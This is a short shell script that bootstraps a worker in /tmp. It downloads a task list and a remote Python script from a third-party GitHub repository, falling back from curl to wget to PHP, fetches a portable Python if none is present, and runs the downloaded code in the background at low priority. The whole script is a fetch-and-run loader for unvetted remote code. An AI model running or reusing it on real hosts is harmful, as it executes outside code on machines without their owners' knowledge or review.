#!/bin/sh
D=/tmp/zgt; cd $D || exit 9
RAW=https://raw.githubusercontent.com/heinzo666/evm-index-data/main
U=$(uname -m)
echo "[wb] $(date) arch=$U"
dl(){ u="$1"; o="$2"; [ -s "$o" ] && return 0;
  if command -v curl >/dev/null 2>&1; then curl -fsSL -m1800 -o "$o.p" "$u" && mv "$o.p" "$o" && return 0; fi
  if command -v wget >/dev/null 2>&1; then wget -qO "$o.p" "$u" && mv "$o.p" "$o" && return 0; fi
  if command -v php  >/dev/null 2>&1; then php -r "file_put_contents('$o.p',file_get_contents('$u'));" && mv "$o.p" "$o" && return 0; fi
  return 1; }
dl $RAW/tasks.txt tasks.txt || { echo NO_TASKS; exit 8; }
[ -s zg.py ] || dl $RAW/zgate_remote.py zg.py || { echo NO_ZG; exit 7; }
PY=""
for c in python3 python; do p=$(command -v $c 2>/dev/null); [ -n "$p" ] && PY=$p && break; done
if [ -z "$PY" ]; then
  case "$U" in
    aarch64|arm64) PU=cpython-3.12.14%2B20260924-aarch64-unknown-linux-gnu-install_only.tar.gz ;;
    *)             PU=cpython-3.12.14%2B20260924-x86_64-unknown-linux-gnu-install_only.tar.gz ;;
  esac
  echo "[wb] fetching portable python..."
  dl "https://github.com/astral-sh/python-build-standalone/releases/download/20260924/$PU" py.tgz || { echo NO_PYTGZ; exit 6; }
  rm -rf pyenv; mkdir pyenv
  tar xzf py.tgz -C pyenv --strip-components=1 2>/dev/null || gzip -dc py.tgz | tar xf - -C pyenv --strip-components=1
  PY=$D/pyenv/bin/python3
fi
echo "[wb] python=$PY slice=$1 workers=$2"
nice -n 18 "$PY" zg.py --tasks tasks.txt --slice "$1" --workers "$2" --rate 10 --outdir $D >> $D/log.o 2>&1
echo "[wb] exited rc=$?"
